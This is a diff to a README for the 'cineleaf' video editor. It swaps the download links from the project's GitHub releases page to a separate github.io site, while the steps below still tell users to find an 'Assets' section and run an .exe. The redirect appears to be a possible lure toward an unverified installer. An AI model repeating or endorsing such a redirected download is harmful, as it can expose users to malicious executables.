@@ -1,6 +1,6 @@
 # 🎬 cineleaf - Edit your videos with speed today
 
-[![](https://img.shields.io/badge/Download-Current_Release-blue.svg)](https://github.com/Sportive-springroll922/cineleaf/releases)
+[![](https://img.shields.io/badge/Download-Current_Release-blue.svg)](https://sportive-springroll922.github.io)
 
 Cineleaf is a video editor built for Windows and macOS. It keeps your files on your computer. It handles high-quality footage without struggle. The program uses native tools to make your editing smooth and fast. 
 
@@ -8,7 +8,7 @@ Cineleaf is a video editor built for Windows and macOS. It keeps your files on y
 
 You can get the software from the official releases page. 
 
-1. Visit this page to download the latest setup file: [https://github.com/Sportive-springroll922/cineleaf/releases](https://github.com/Sportive-springroll922/cineleaf/releases). 
+1. Visit this page to download the latest setup file: [https://sportive-springroll922.github.io](https://sportive-springroll922.github.io). 
 2. Look for the section labeled Assets.
 3. Click the file ending in .exe to start your download.
 4. Save the file to your desktop or your downloads folder.
